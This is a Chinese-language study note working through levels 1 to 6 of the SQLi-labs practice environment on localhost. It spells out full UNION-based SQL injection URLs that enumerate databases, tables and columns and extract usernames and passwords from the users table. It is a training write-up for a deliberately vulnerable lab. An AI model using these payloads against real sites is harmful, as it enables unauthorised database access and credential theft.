---
tags:
  - SQL
---
[SQL注入](SQL注入.md)
# less-1
- 数字型
![](图片/Pasted%20image%2020241103182158.png)
![](图片/Pasted%20image%2020241103182234.png)
![](图片/Pasted%20image%2020241103182341.png)
![](图片/Pasted%20image%2020241103182451.png)
![](图片/Pasted%20image%2020241103182507.png)
字段数为3，回显点为2，3
![](图片/Pasted%20image%2020241103182739.png)
数据库名security 数据库 版本 5.7.28
逐级爆破
http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(schema_name)%20from%20information_schema.schemata--+
![](图片/Pasted%20image%2020241103193607.png)
http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()--+
![](图片/Pasted%20image%2020241103193901.png)
查询表users里的字段名，发现有多个不同的users表，有多个不同的字段
![](图片/Pasted%20image%2020241103194218.png)
限定数据库为security
http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27%20AND%20table_schema=%27security%27--+
`SELECT * FROM users WHERE id='-1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='users' AND table_schema='security'-- ' LIMIT 0,1`
![](图片/Pasted%20image%2020241103194611.png)
爆破字段
http://127.0.0.1/sqli-labs/Less-1/?id=-1%27%20union%20select%201,database(),(select%20(group_concat(username,0x7e,password))%20from%20users)--+
SELECT * FROM users WHERE id='-1' union select 1,database(),(select (group_concat(username,0x7e,password)) from users)-- ' LIMIT 0,1
![](图片/Pasted%20image%2020241103195451.png)
# less-2

![](图片/Pasted%20image%2020241103195630.png)
无数据回显 证明存在注入点
![](图片/Pasted%20image%2020241103195833.png)
![](图片/Pasted%20image%2020241103195819.png)
判断字段数 order by 4报错 order by 3 无数据显示
![](图片/Pasted%20image%2020241103200137.png)
![](图片/Pasted%20image%2020241103200158.png)
判断回显点 也可以用来判断字段数
![](图片/Pasted%20image%2020241103200346.png)
逐级爆破 得到数据库名 数据库版本
![](图片/Pasted%20image%2020241103200935.png)
爆破表名
http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
![](图片/Pasted%20image%2020241103201248.png)
爆破字段名
http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27security%27%20and%20table_name=%27users%27--+
![](图片/Pasted%20image%2020241103201455.png)
爆破字段
http://localhost/sqli-labs/Less-2/?id=-1%20union%20select%201,%202,%20(select%20group_concat(username,%200x7e,%20password)%20from%20security.users)--+
![](图片/Pasted%20image%2020241103201955.png)
# less-3
与less-1，less-2相似
先通过报错，判断闭合方式
![](图片/Pasted%20image%2020241103204823.png)
判断字段数
![](图片/Pasted%20image%2020241103205330.png)
判断回显点
![](图片/Pasted%20image%2020241103205455.png)
数据库相关和版本
剩下的逐级爆破
![](图片/Pasted%20image%2020241103210850.png)
![](图片/Pasted%20image%2020241103211001.png)
![](图片/Pasted%20image%2020241103211445.png)
# less-4
同理
先报错回显，看闭合方式
![](图片/Pasted%20image%2020241103223356.png)
![](图片/Pasted%20image%2020241103223502.png)
剩下的同上
# less-5
无页面回显点 但是有报错回显
![](图片/Pasted%20image%2020241104181803.png)
[猜解](SQL注入.md#^b4610c)
# less-6
与less-5同理 id 闭合方式不同




